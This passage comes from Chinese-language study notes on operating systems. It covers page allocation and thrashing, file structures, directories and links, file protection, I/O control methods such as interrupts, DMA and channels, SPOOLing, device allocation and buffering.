页面分配策略</h3><p>1、驻留集</p><p>指请求分页存储管理中给进程分配的物理块的集合</p><p>在采用了虚拟存储技术的系统中，驻留集大小一般小于进程的总大小。</p><p>若驻留集太小，会导致缺页频繁，系统要花大量的时间来处理缺页，实际用于进程推进的时间很少：<br>驻留集太大，又会导致多道程序并发度下降，资源利用率降低。所以应该选择一个合适的驻留集大小。</p><p>2、页面分配、置换策略</p><ul><li>固定分配局部替换：驻留集大小不可改变</li></ul><p>固定分配全局置换不存在</p><p>固定分配局部置换：系统为每个进程分配一定数量的物理块，在整个运行期间都不改变。若进程在运<br>行中发生缺页，则只能从该进程在内存中的页面中选出一页换出，然后再调入需要的页面。这种策略<br>的缺点是：很难在刚开始就确定应为每个进程分配多少个物理块才算合理。</p><p><strong>可变分配：驻留集大小可变</strong></p><ul><li><strong>可变分配全局替换：可以将操作系统保留的空闲物理块分配给缺页进程</strong></li></ul><p>可变分配全局罩换：刚开始会为每个进程分配一定数量的物理块。操作系统会保持一个空闲物理块队<br>列。当某进程发生缺页时，从空闲物理块中取出一块分配给该进程；若已无空闲物理块，则可选择一<br>个未锁定的页面换出外存，再将该物理块分配给缺页的进程。采用这种策略时，只要某进程发生缺页，<br>都将获得新的物理块，仅当空闲物理块用完时，系统才选择一个未锁定的页面调出。被选择调出的页<br>可能是系统中任何一个进程中的页，因此这个被选中的进程拥有的物理块会减少，缺页率会增加。</p><ul><li><strong>可变分配局部替换：发生缺页时只能选进程自己的物理块置换</strong></li></ul><p>可变分配局部置换：刚开始会为每个进程分配一定数量的物理块。当某进程发生缺页时，只允许从该<br>进程自己的物理块中选出一个进行换出外存。如果进程在运行中频繁地缺页，系统会为该进程多分配<br>几个物理块，直至该进程缺页率趋势适当程度；反之，如果进程在运行中缺页率特别低，则可适当减<br>少分配给该进程的物理块。</p><p>3、调入页面的时机</p><p>预调页策略：一次调用若干个相邻页面，主要用于进程的首次调入</p><p>请求调页策略：运行发现缺页时将缺页面调入内存  缺点：I/O 开销较大</p><p>4、从何处调页</p><p>对换区：读写速度快，采用连续分配方式</p><p>文件区：读写速度慢，采用离散分配方式</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230804145355874.png" alt="image-20230804145355874"></p><p>5、抖动（颠簸）现象</p><p>刚刚换出的又要换入，刚刚换入的又要换出，物理块不够</p><p>6、工作集</p><p>指在某段时间间隔里，进程实际访问页面的集合</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230804152323394.png" alt="image-20230804152323394"></p><h3 id="41_1-初识文件管理"><a class="markdownIt-Anchor" href="#41_1-初识文件管理">#</a> 4.1_1 初识文件管理</h3><p>文件：就是一组有意义的信息 / 数据集合</p><p><strong>操作系统向上提供的五个基础功能</strong></p><p>创建文件 (create. 系统调用)<br> 删除文件 (delete 系统调用)<br> 读文件 (read 系统调用)<br> 写文件 (write 系统调用)<br> 打开文件 (open 系统调用)<br> 关闭文件 (close. 系统调用)</p><p><strong>文件的属性</strong></p><p><strong>文件名</strong>：由创建文件的用户决定文件名，主要是为了方便用户找到文件，同一目录下不允许有重名文件</p><p><strong>标识符</strong>：一个系统内的各文件标识符唯一，对用户来说毫无可读性因此标识符只是操作系统用于区分<br>各个文件的一种内部名称<br><strong>类型</strong>：指明文件的类型<br><strong>位置</strong>：文件存放的路径（让用户使用)、在外存中的地址（操作系统使用，对用户不可见)<br><strong> 大小</strong>：指明文件大小创建时间、上次修改时间文件所有者信息<br><strong>保护信息</strong>：对文件进行保护的访问控制信息</p><p>提供的功能：</p><p>处理机管理</p><p>存储器管理</p><p>文件管理</p><p>设备管理</p><p>目标：安全高效</p><h3 id="41_2-文件的逻辑结构"><a class="markdownIt-Anchor" href="#41_2-文件的逻辑结构">#</a> 4.1_2 文件的逻辑结构</h3><p>文件的逻辑结构：从用户观点所观察的文件组织形式</p><p>文件的物理结构：文件的存储结构，指系统将文件存储在外存上所形成的一种存储组织形式</p><p><strong>无结构文件</strong>：文件内部的数据就是一系列二进制流或字符流组成。又称 “流式文件”。如：<br>Windows 操作系统中的.txt 文件<br><strong>有结构文件</strong>：由一组相似的记录组成，又称 “记录式文件”。每条记录又若干个数据项组成。如：<br>数据库表文件。一般来说，每条记录有一个数据项可作为关键字（作为识别不同记录的 D〉</p><p>2、有结构文件（记录式文件）</p><p>按文件的组织方式分类（针对有结构文件而言）：顺序文件、索引文件、索引顺序文件、直接文件、哈希文件</p><p>1、<strong>顺序文件</strong>：文件中的记录一个接一个顺序排列，记录可以是定长或可变长，各个记录在物理上可以顺序存储或者链式存储</p><p>按照是否与关键字顺序有关，可以分为串结构和顺序结构</p><p>链式存储：无论是定长何变长记录，都无法实现随机存取，每次只能从第一个记录开始依次往后查找</p><p>顺序存储：</p><ul><li>可变长：无法实现随机存取。每次只能从第一个记录开始依次往后查找</li><li>定长：</li><li>可实现随机存取。记录长度为 L, 则第 ⅰ 个记录存放的相对位置是 i*L</li><li>若采用串结构，无法快速找到某关键字对应的记录</li><li>若采用顺序结构，可以快速找到某关键字对应的记录<br> (如折半查找)</li></ul><p>顺序文件的缺点是增加 / 删除一个记录比较困难</p><p>2、<strong>索引文件</strong>：</p><ul><li>按关键字建立索引：为变长记录文件建立一张索引表、索引表按关键字排序、实现直接存取</li><li>具有多个索引表的索引文件：为顺序文件建立多个索引表、为每一个可能成为检索条件的域配置一张索引表</li></ul><p>3、<strong>索引顺序文件</strong>：多级索引表嵌套查找</p><p>若采用索引顺序文件结构，可把 10000 个记录分为 V10000=100 组，每组 100 个记录。则需要先顺序查找<br>索引表找到分组（共 100 个分组，因此索引表长度为 100，平均需要查 50 次），找到分组后，再在分组中<br>顺序查找记录（每个分组 100 个记录，因此平均需要查 50 次）。可见，采用索引顺序文件结构后，平均查<br>找次数减少为 50+50=100 次。</p><h3 id="41_3-文件目录"><a class="markdownIt-Anchor" href="#41_3-文件目录">#</a> 4.1_3 文件目录</h3><p>1、文件控制块（FCB）</p><p>一个文件对应一个 FCB, 一个 FCB 就是一个目录下，多个 FCB 组成文件目录</p><p>对文件目录进行的操作：搜索、创建文件、删除文件、显示目录、修改目录</p><p>2、目录结构</p><ul><li><p>单级目录结构：实现了按名存取 但是不允许文件重名</p></li><li><p>两级目录结构 分为主文件目录（MFD) 和用户文件目录（UFD)    允许不同用户的文件重名但不能对文件进行分类</p></li><li><p>多级目录结构（树形目录结构）</p></li></ul><p>不同目录下的文件 key 重名，可以对文件进行分类，不方便文件共享</p><p>系统根据文件路径找到目标文件</p><p>从根目录出发的路径称为绝对路径比如 / Suiyu/1.jpg</p><p>从当前目录出发的是相对路径</p><p>linux 中  “.” 表示当前目录  比如./suiyu/1.jpg 表示从当前目录出发的相对路径</p><p>首先从外存读入根目录的目录表  找到 suiyu 存放的位置  在从外存读入对应的目录表  找到 1.jpg 的存放位置，整个过程需要三次读磁盘 I/O 操作</p><p>树形目录结构可以很方便地对文件进行分类，层次结构清晰，也能够更有效地进行文件的管理和保护。<strong>但</strong><br><strong>是，树形结构不便于实现文件的共享</strong>。</p><ul><li><p>无环图目录 结构</p><p>在属性目录的解出上，增加了一些指向同一节点的有向边，使整个目录成为一个有向无环图</p><p>可以共享  可以用不同的文件名指向同一个文件</p><p>需要为每个共享结点设置一个共享计数器，用于记录此时有多少个地方在共享该结点。用户提出删除结点的请求时，只是删除该用户的 FCB、并使共享计数器减 1，并不会直接删除共享结点。</p><p>只有共享计数器减为 0 时才删除结点。</p></li></ul><p>3、索引节点（对文件控制块</p><p>除了文件名之外的所有信息都放到索引结点中，每个文件对应一个索引结点<br>目录项中只包含文件名、索引结点指针，因此每个目录项的长度大幅减小<br>由于目录项长度减小，因此每个磁盘块可以存放更多个目录项，因此检索文件时磁盘 / O 的次数就少了很多</p><h3 id="41_6-文件的基本操作"><a class="markdownIt-Anchor" href="#41_6-文件的基本操作">#</a> 4.1_6 文件的基本操作</h3><p><strong>创建文件（create）</strong></p><p>需要提供的几个主要参数：1、文件存放路径  2、文件名 3、所需外存大小</p><p>主要做的事</p><p>1、在外存中找到文件所需的空间</p><p>2、创建该文件对应的目录项</p><p><strong>删除文件 (delete)</strong></p><p>需要提供的几个主要参数：1、文件存放路径  2、文件名</p><p>主要做的事</p><p>1、找到文件名对应的目录项</p><p>2、回收文件占用的磁盘块</p><p>3、删除文件对应的目录项</p><p>读文件 (read)</p><p>写文件 (write)</p><p><strong>打开文件 (open)</strong></p><p>需要提供的几个主要参数：1、文件存放路径  2、文件名 3、要对文件的操作类型 （如 r 只读  rw 读写）</p><p>主要做的事</p><p>1、找到文件名对应的目录项</p><p>2、将目录项复制到内存中的 “打开文件” 中</p><p>进程打开表中特有的属性：读写指针，访问权限</p><p>系统打开文件表中特有的属性：打开计数器（有多少进程打开了该文件）</p><p><strong>关闭文件 (close)</strong></p><p>主要做的事</p><p>1、将进程文件表相应的表项删除</p><p>2. 回收分配给该文件的内存空间等资源<br> 3. 系统打开文件表的打开计数器 count 减 1，若 count=0, 则删除对应表项。</p><h3 id="41_7-文件共享"><a class="markdownIt-Anchor" href="#41_7-文件共享">#</a> 4.1_7 文件共享</h3><p>1、基于索引结点的共享方式（硬链接）</p><p><strong>直接指向文件的索引节点</strong></p><p>各个用户的目录项指向同一个索引结点<br>索引结点中需要有链接计数 count<br> 某用户想删除文件时，只是删除该用户的目录项，且 count—<br> 只有 cout==0 时才能真正删除文件数据和索引结点，否则会导致指针悬空</p><p>2、基于符号链的共享方式（软链接）</p><p><strong>相当于 win 的快捷方式</strong></p><p>在一个 Link 型的文件中记录共享文件的存放路径 (Windows 快捷方式)<br> 操作系统根据路径一层层查找目录，最终找到共享文件<br>即使软链接指向的共享文件已被删除，Lik 型文件依然存在，只是通过 Lik 型文件中的路径去查找共享文件会失败（找不到对应目录项）<br>由于用软链接的方式访问共享文件时要查询多级目录，会有多次磁盘 I/O, 因此用软链接访问</p><h3 id="41_8-文件保护"><a class="markdownIt-Anchor" href="#41_8-文件保护">#</a> 4.1_8 文件保护</h3><p>1、口令保护</p><p>优点：保存口令的空间开销不多，验证口令的时间开销也很小</p><p>缺点：正确的口令存放在系统内部，不够安全。</p><p>2、加密保护</p><p>使用某个密码对文件进行加密，在访问</p><p>优点：保密性强，不需要在系统中存储 “密码</p><p>缺点：加密 / 解密，需要花费一定时间</p><p>3、访问控制<br>在每个文件的 FCB（或索引结点）中增加一个访问控制表（ACL），该表记录了各个用户可以对该文件执行哪些操作 如：读，写，执行，添加，删除，列表清单（列出文件名和文件属性）</p><h3 id="41_9-文件系统的层次结构简单了解就行"><a class="markdownIt-Anchor" href="#41_9-文件系统的层次结构简单了解就行">#</a> 4.1_9 文件系统的层次结构（简单了解就行）</h3><p>用户 / 应用程序</p><p>用户接口</p><p>文件目录系统</p><p>存取控制模块</p><p>逻辑文件系统与文件信息缓冲区</p><p>物理文件系统</p><p>辅助分配模块 设备管理模块</p><p>设备</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230807133112367.png" alt="image-20230807133112367"></p><h3 id="51_1-i-o设备的概念和分类"><a class="markdownIt-Anchor" href="#51_1-i-o设备的概念和分类">#</a> 5.1_1 I-O 设备的概念和分类</h3><p>1、什么是 I/O 设备</p><p>输入 / 输出</p><p>2、按使用特性分类</p><p>人机交互的外部设备（鼠标 键盘）  数据传输速度慢</p><p>存储设备   数据传输速度快</p><p>网络通信设备  数据传输速度介于上述二者之间</p><p>3、按传输速率分类</p><p>低速设备、中速设备、高速设备</p><p>4、按信息交换的单位分类</p><p>块设备 (传输快，可寻址)、字符设备（传输慢，不可寻址，常采用中断驱动方式）</p><h3 id="51_2-i-o控制器设备控制器"><a class="markdownIt-Anchor" href="#51_2-i-o控制器设备控制器">#</a> 5.1_2 I-O 控制器（设备控制器）</h3><p>CPU 无法直接控制 I/O 设备的机械部件，因此 I/o 设备还要有一个电子部件作为 CPU 和 I/O 设备机械部<br>件之间的 “中介”，用于实现 CPU 对设备的控制。<strong>这个电子部件就是 I/O 控制器，又称设备控制器</strong>。CPU 可控制 I/O 控制器，又由 I/O 控制器来控制设备的机械部件。</p><p>机械部件：鼠标等</p><p>电子部件</p><p>功能：</p><p><strong>控制寄存器</strong></p><p>1、接受和识别 CPU 发出的命令  如 read/write 命令</p><p><strong>状态寄存器</strong></p><p>2、向 CPU 报告设备的状态  用于记录 I/O 设备的当前状态</p><p><strong>数据寄存器</strong></p><p>3、数据交换</p><p>输出时，数据寄存器用于暂存 CPU 发来的数据，之后再由控制器传送设备。输入时，数据寄存器用于暂存设<br>备发来的数据，之后 CPU 从数据寄存器中取走数据</p><p><strong>I/O 逻辑</strong></p><p>4、地址识别 类似于内存地址  用来判断 CPU 要读 / 写的是哪个寄存器</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/3fa359c8eb1eec40777b86bb0614bc4d.png" alt="img"></p><p>有的计算机会让这些寄存器占用内存地址的一部分，称为内存映像 I/O: 另一些计算机则采用 I/O 专用地址，即寄存器独立编址。</p><p>①设备控制器的组成部分主要包括设备控制器与 CPU 的接口，设备控制器与设备的接口、I/O 逻辑这 3 部分。</p><p>②设备控制器应具备接收和识别命令、交换数据、标志和报告设备的状态、缓冲地址、识别数据、控制差错等功能。</p><h3 id="51_3-i-o控制方式"><a class="markdownIt-Anchor" href="#51_3-i-o控制方式">#</a> 5.1_3 I-O 控制方式</h3><h4 id="1-程序直接控制方式"><a class="markdownIt-Anchor" href="#1-程序直接控制方式">#</a> <strong>1、程序直接控制方式</strong></h4><p>轮询：完成一次读 / 写操作的流程</p><p>1.CPU 干预的频率<br>很频繁，I/O 操作开始之前、完成之后需要 CPU 介入，并且<br>在等待 I/O 完成的过程中 CPU 需要不断地轮询检查。<br>2. 数据传送的单位<br>每次读 / 写一个字<br> 3. 数据的流向<br>读操作（数据输入）：I/O 设备→CPU→内存<br>写操作（数据输出）：内存→CPU→I/o 设备<br>每个字的读 / 写都需要 CPU 的帮助</p><p>4. 主要缺点和主要优点<br>优点：实现简单。在读 / 写指令之后，加上实现循环检查的<br>一系列指令即可（因此才称为 “程序直接控制方式”）</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230807213054899.png" alt="image-20230807213054899"></p><h4 id="2-中断驱动方式"><a class="markdownIt-Anchor" href="#2-中断驱动方式">#</a> <strong>2、中断驱动方式</strong></h4><p>引入中断机制。由于 I/O 设备速度很慢，因此在 CPU 发出读写命令后，可将等待 I/O 的进程阻塞，先切换到别的进程执行。当 I/O 完成后，控制器会向 CPU 发出一个中断信号，CPU 检测到中断信号后，会保存当前进程的运行环境信息，转去执行中断处理程序处理该中断。处理中断的过程中，CPU 从 I/O 控制器读一个字的数据传送到 CPU 寄存器，再写入主存。接着，CPU 恢复等待 I/O 的进程（或其他进程）的运行环境，然后继续执行</p><p>2.CPU 干预的频率<br>每次 I/O 操作开始之前、完成之后需要 CPU 介入。<br>等待 I/O 完成的过程中 CPU 可以切换到别的进程执行。<br>3. 数据传送的单位<br>每次读 / 写一个字<br> 4. 数据的流向<br>读操作（数据输入）：I/O 设备→CPU→内存<br>写操作（数据输出）：内存→CPU→I/O 设备<br> 5. 主要缺点和主要优点<br>优点：与 “程序直接控制方式” 相比，在 “中断驱动方式” 中，I/O 控制器会通过中断信号主动报告 I/O 已完成，CPU 不再需要不停地轮询。CPU 和 I/O 设备可并行工作，CPU 利用率得到明显提升。</p><p>缺点：每个字在 I/O 设备与内存之间的传输，都需要经过 CPU。而频繁的中断处理会消耗较多的 CPU 时间。</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230807213106809.png" alt="image-20230807213106809"></p><h4 id="3-dma方式直接存储器存取"><a class="markdownIt-Anchor" href="#3-dma方式直接存储器存取">#</a> <strong>3、DMA 方式：直接存储器存取</strong></h4><p>CPU 发出 I/O 命令后可以做其他事，本次 I/O 完成后 DMA 控制器发出中断信号</p><p>DR（数据寄存器)：暂存从设备到内存，或从内存到设备的数据。<br>MAR (内存地址寄存器)：在输入时，MAR 表示数据应放到内存中的什么<br>位置；输出时 MAR 表示要输出的数据放在内存中的什么位置。<br>DC (数据计数器)：表示剩余要读 / 写的字节数。<br>CR (命令 / 状态寄存器)：用于存放 CPU 发来的 I/o 命令，或设备的状态信息。</p><p>2.CPU 干预的频率<br>仅在传送一个或多个数据块的开始和结束时，才需要 CPU 干预。<br>3. 数据传送的单位<br>每次读 / 写一个或多个块（注意：每次读写的只能是连续的多个块，<br>且这些块读入内存后在内存中也必须是连续的)<br> 4. 数据的流向（不再需要经过 CPU)<br> 读操作（数据输入）：I/O 设备→内存<br>写操作（数据输出）：内存→I/O 设备</p><p>5. 主要缺点和主要优点<br>优点：数据传输以 “块” 为单位，CPU 介入频率进一步降低。数据的传输不再需要先经过 CPU 再写入内<br>存，数据传输效率进一步增加。CPU 和 I/O 设备的并行性得到提升。<br>缺点：CPU 每发出一条 I/O 指令，只能读 / 写一个或多个连续的数据块。</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230807213116188.png" alt="image-20230807213116188"></p><h4 id="4-通道控制方式"><a class="markdownIt-Anchor" href="#4-通道控制方式">#</a> <strong>4、通道控制方式</strong></h4><p>CPU 发出 I/O 命令后可以做其他事。通道会执行通道程序以完成 I/O, 完成后通道向 CPU 发出中断信号</p><p>通道：通道是一种特殊的处理机，它具有执行 I/O 指令的能力，并且可以通过执行<br>通道 I/O 程序来控制 I/O 操作。</p><p>通道程序：任务清单</p><p>2.CPU 干预的频率<br>极低，通道会根据 CPU 的指示执行相应的通道程序，只有完成一组数据块<br>的读 / 写后才需要发出中断信号，请求 CPU 千预。<br>3. 数据传送的单位<br>每次读 / 写一组数据块<br> 4. 数据的流向（在通道的控制下进行）<br>读操作（数据输入）：I/O 设备→内存<br>写操作（数据输出）：内存→I/O 设备<br> 5. 主要缺点和主要优点<br>缺点：实现复杂，需要专门的通道硬件支持<br>优点：CPU、通道、/O 设备可并行工作，资源利用率很高。</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230807213132075.png" alt="image-20230807213132075"></p><h3 id="51_4-i-o软件层次结构"><a class="markdownIt-Anchor" href="#51_4-i-o软件层次结构">#</a> 5.1_4 I-O 软件层次结构</h3><p><strong>1、用户层软件</strong></p><p>实现与用户交互的接口，向上提供方便易用的库函数</p><p><strong>2、设备独立性软件（设备无关性软件）</strong></p><p>主要实现的功能：</p><p>1、向上层提供统一的调用接口（read/write）</p><p>2、设备的保护</p><p>3、差错处理</p><p>4、设备的分配与回收</p><p>5、数据缓冲区管理</p><p>6、建立逻辑设备名到物理设备名的映射关系</p><p>操作系统系统可以采用两种方式管理逻辑设备表 (LUT):<br> 第一种方式，整个系统只设置一张 LUT, 这就意味着所有用户不能使用相同的逻辑设备名，因此这<br>种方式只适用于单用户操作系统。<br>第二种方式，为每个用户设置一张 LUT, 各个用户使用的逻辑设备名可以重复，适用于多用户操作<br>系统。系统会在用户登录时为其建立一个用户管理进程，而 LUT 就存放在用户管理进程的 PCB 中。</p><p>7、根据设备类型选择调用相应的驱动程序</p><p><strong>3、设备驱动程序（比如打印机驱动）</strong></p><p>设置设备寄存器、检查设备状态</p><p><strong>4、中断处理程序</strong></p><p>设备中断处理程序要完成：①唤醒被阻塞的驱动进程；②保存被中断进程的 CPU 现场信息；③转人相应的设备处理程序；④处理中断；⑤恢复被中断进程的 CPU 现场。<br>对中断进行处理的过程为：①测定是否有未响应的中断信号；②保护被中断进程的 CPU 现场：<br>③转人相应的设备处理程序；④处理中断；⑤恢复 CPU 现场并退出中断。</p><p><strong>5、硬件</strong></p><p>执行 IO 操作，有机械部件、电子部件组成</p><p><strong>理解并记住 I/O 软件各个层次之间的顺序，要能够推理判断某个处理应该是在哪个层次完成的（最常考的</strong><br><strong>是设备独立性软件、设备驱动程序这两层。只需理解一个特点即可：直接涉及到硬件具体细节、且与中</strong><br><strong>断无关的操作肯定是在设备驱动程序层完成的；没有涉及硬件的、对各种设备都需要进行的管理工作都</strong><br><strong>是在设备独立性软件层完成的)</strong></p><h3 id="51_5-i-o核心子系统"><a class="markdownIt-Anchor" href="#51_5-i-o核心子系统">#</a> 5.1_5 I-O 核心子系统</h3><p>1、用户层软件</p><p>假脱机系统</p><p>2、设备独立性软件（设备无关性软件）</p><p>IO 调度、设备保护、设备分配与回收、缓冲区管理</p><p>3、设备驱动程序（比如打印机驱动）</p><p>4、中断处理程序</p><p>5、硬件</p><h3 id="51_6-假脱机技术"><a class="markdownIt-Anchor" href="#51_6-假脱机技术">#</a> 5.1_6 假脱机技术</h3><p>1、什么是脱机技术，脱机技术可以解决什么问题</p><p>脱离主机的控制进行输入 / 输出控制</p><p>2、假脱机技术</p><p>SPPOLing 系统（是用软件的方式模拟脱机技术）：必须要有多道程序并发进行</p><p>假脱机技术的实现原理</p><ul><li>输入井和输出井 ———— 模拟脱机输入 / 输出时的磁带</li><li>输入进程和输出进程 ———— 模拟脱机输入输出时的外围控制机</li><li>输入缓冲区和输出缓冲区 ———— 内存中的缓冲区，输入、输出时的 “中转站”</li></ul><p>3、共享打印机的原理分析</p><p>用 SPOOLing 技术将独占式的打印机 &quot;虚拟&quot; 成共享打印机】</p><p>独占式设备一一只允许各个进程串行使用的设备。一段时间内只能满足一个进程的请求。<br>共享设备一一允许多个进程 “同时” 使用的设备（宏观上同时使用，微观上可能是交替使<br>用)。可以同时满足多个进程的使用请求。</p><p>虚拟设备一一采用 SPOOLing 技术将独占设备改造成虚拟的共享设备，可同时分配给多个进程使<br>用（如采用 SPOOLing 技术实现的共享打印机）</p><h3 id="51_7-设备的分配与回收"><a class="markdownIt-Anchor" href="#51_7-设备的分配与回收">#</a> 5.1_7 设备的分配与回收</h3><p>1、设备分配时应考虑的因素</p><p>设备的固有属性：独占设备、共享设备、虚拟设备</p><p>设备分配算法：先来先服务，优先级高者优先，短任务优先等</p><p>设备分配中的安全：为进程分配一个设备后就将进程阻塞，本次 I/O 完成后才将进程唤醒（一个时间段内每个进程只能使用一个设备</p><p>优点：破坏了 “请求和保持” 条件，不会死锁<br>缺点：对于一个进程来说，CPU 和 I/O 设备只能串行工作</p><p>不安全分配方式：进程发出 I/O 请求后，系统为其分配 I/O 设备，进程可继续执行，之后还可以发出<br>新的 I/O 请求。只有某个 I/O 请求得不到满足时才将进程阻塞。(一个进程可以同时使用多个设备)</p><p>优点：进程的计算任务和 I/O 任务可以并行处理，使进程迅速推进<br>缺点：有可能发生死锁（死锁避免、死锁的检测和解除）</p><p>2、静态分配与动态分配</p><p>静态分配：进程运行前为其分配全部所需资源、运行结束后归还资源（破坏了请求和保持条件，不会发生死锁）</p><p>动态分配：运行中动态分配</p><p>3、设备分配管理中的数据结构</p><p>系统设备表 SDT：记录了系统中全部设备的情况，每个设备对应一个表目。记录表目：（设备类型、设备标识符、DCT、驱动程序入口）了系统中全部设备的情况</p><p>设备控制表 DCT：系统为每个设备设置一张 DCT，用于记录设备情况（设备类型、设备标识符、设备状态、指向控制器表的指针、重复执行次数或事件、设备队列的队首指针）</p><p>控制器控制表 COCT：每个设备控制器都会对应一张 COCT。操作系统根据 COCT 的信息对控制器进行操作和管理。</p><p>通道控制表 CHCT：每个通道都会对应一张 CHCT。操作系统根据 CHCT 的信息对通道进行操作和管理 （通道标识符、通道状态、与通道连接的控制器表首址、通道队列的队首指针、通道队列的队尾指针）</p><p>4、设备分配的步骤</p><p>根据进程请求的物理设备名 ——&gt; 系统设备表 ——&gt; 设备控制表 ——&gt; 控制器控制表 ——&gt; 通道</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230809125036440.png" alt="image-20230809125036440"></p><p>5、设备分配步骤的改进方法</p><p>建立逻辑设备名和设备的映射</p><p>6、逻辑设备表的设置问题</p><p>整个系统只有一张 LUT: 各用户所用的逻辑设备名不允许重复，适用于单用户操作系统<br>每个用户一张 LUT: 不同用户的逻辑设备名可重复，适用于多用户操作系统</p><h3 id="51_8-缓冲区管理"><a class="markdownIt-Anchor" href="#51_8-缓冲区管理">#</a> 5.1_8 缓冲区管理</h3><p>1、什么是缓冲区？有什么作用？</p><p>缓冲区是一个存储区域</p><p>可以由专门的硬件寄存器组成，也可以利用内存作为缓冲区</p><p>缓冲区的作用：</p><p>1、缓和 CPU 与 I/O 设备之间速度不匹配的矛盾</p><p>2、减少对 CPU 的中断频率</p><p>3、解决数据粒度不匹配的问题</p><p>4、提高 CPU 与 IO 设备之间的并行性</p><p>2、单缓冲</p><p>在内存中分配一块缓冲区</p><p><strong>注意：当缓冲区数据非空时，不能往缓冲区冲入数据，只能从缓冲区把数据传出；当缓冲区为空时，</strong><br><strong>可以往缓冲区冲入数据，但必须把缓冲区充满以后，才能从缓冲区把数据传出。</strong></p><p>单缓冲题目中，假设初始状态为：工作区满，缓冲区空</p><p>C 为 CPU 的处理速度  M 为传输速度，T 为 I/O 设备的输入速度</p><p>处理一块时间 = max（C,T)+M</p><p>3、双缓冲</p><p>在内存中分配两块缓冲区</p><p>双缓冲题目中，假设初始状态为：工作区空，其中一个缓冲区满，另一个缓冲区空</p><p>max(T,C+M)</p><p>4、循环缓冲</p><p>将多个大小相等的缓冲区链接成一个循环队列。</p><p>5、缓冲池</p><p>由系统中共用的缓冲区组成。这些缓冲区可以分为：空缓冲队列、装满输入数据的缓冲队列、装满输出数据的缓冲队列</p><h3 id="文件的物理结构外存的组织方式-重点"><a class="markdownIt-Anchor" href="#文件的物理结构外存的组织方式-重点">#</a> 文件的物理结构（外存的组织方式） 重点</h3><p>1、对非空闲磁盘块的管理</p><p>连续分配：连续分配方式要求每个文件在磁盘上占有一组连续的块（也就是逻辑块上相邻  物理块上也要相邻），对文件的拓展不方便，存储空间利用率低会产生难以利用的磁盘碎片，支持顺序访问和直接访问（即随机访问）</p><p>物理块号 = 起始块号 + 逻辑块号</p><p>连续分配的文件在顺序读 / 写时速度最快</p><p>优点：支持顺序访问和直接访问（即随机访问）；连续分配的文件在顺序访问时速度最快<br>缺点：不方便文件拓展；存储空间利用率低，会产生磁盘碎片 ，不能灵活的删除和插入记录</p><p>链接分配采取离散分配的方式</p><ul><li>隐式链接：采用链接分配方式的文件，只支持顺序访问，不支持随机访问，方便拓展</li></ul><p>优点：很方便文件拓展，不会有碎片问题，外存利用率高。<br>缺点：只支持顺序访问，不支持随机访问，查找效率低，指向下一个盘块的指针也需要耗费少量<br>的存储空间。</p><ul><li>显示链接：文件分配表显式记录下一块物理块的位置，方便拓展，支持随机访问和顺序访问，文件表会占内存空间  相比隐式链接来说访问速度快  因为块号的转换过程不需要访问磁盘，不会产生外部碎片</li></ul><p>优点：很方便文件拓展，不会有碎片问题，外存利用率高，并且支持随机访问。相比于隐式链接<br>来说，<strong>地址转换时不需要访问磁盘，因此文件的访问效率更高。</strong><br>缺点：文件分配表的需要占用一定的存储空间。</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230805223539619.png" alt="image-20230805223539619"></p><p>索引分配</p><p>索引分配允许文件离散地分配在各个磁盘块中，系统会为每个文件建立一张索引表，索引表记录了文件的各个逻辑块对应的物理块</p><p>索引表存放的磁盘块称为索引块。文件数据存放的磁盘块称为数据块</p><p>支持随机访问，文件拓展也很容易实现，但是索引表需要占用一定的存储空间</p><p>索引分配的三种方法</p><ul><li><p>链接方案：如果索引表太大，一个索引块装不下可以将多个索引块链接起来存放</p></li><li><p>多层索引：建立多层索引（原理类似于多级页表）。使第一层索引块指向第二层的索引块。还可根据<br>文件大小的要求再建立第三层、第四层索引块。</p></li></ul><p>若采用多层索引，则各层索引表大小不能超过一个磁盘块</p><ul><li>混合索引：多种索引分配方式的结合。例如，一个文件的顶级索引表中，既包含直接地址索引（直接<br>指向数据块)，又包含一级间接索引（指向单层索引表）、还包含两级间接索引（指向两层索引表）。</li></ul><p>优点：①既能顺序存取，又能随机存取：②能适应文件的动态增长；③方更插入、修改和别除记录。</p><p>缺点：①需要较多的寻道次数和较长的寻道时间；②索引表增加了系统开销，包括内存空间和存取时间。</p><p>若顺序文件中所含有的记录数为 N, 则检索到指定关键字的记录平均须查找 N/2 个记录。但对于素引顺序文件，检素到指定关键字的记录平均须查找<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msqrt><mi>N</mi></msqrt></mrow><annotation encoding="application/x-tex">\sqrt{N}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.04em;vertical-align:-0.1133em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9267em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord" style="padding-left:0.833em;"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span><span style="top:-2.8867em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg xmlns="http://www.w3.org/2000/svg" width='400em' height='1.08em' viewBox='0 0 400000 1080' preserveAspectRatio='xMinYMin slice'><path d='M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221l0 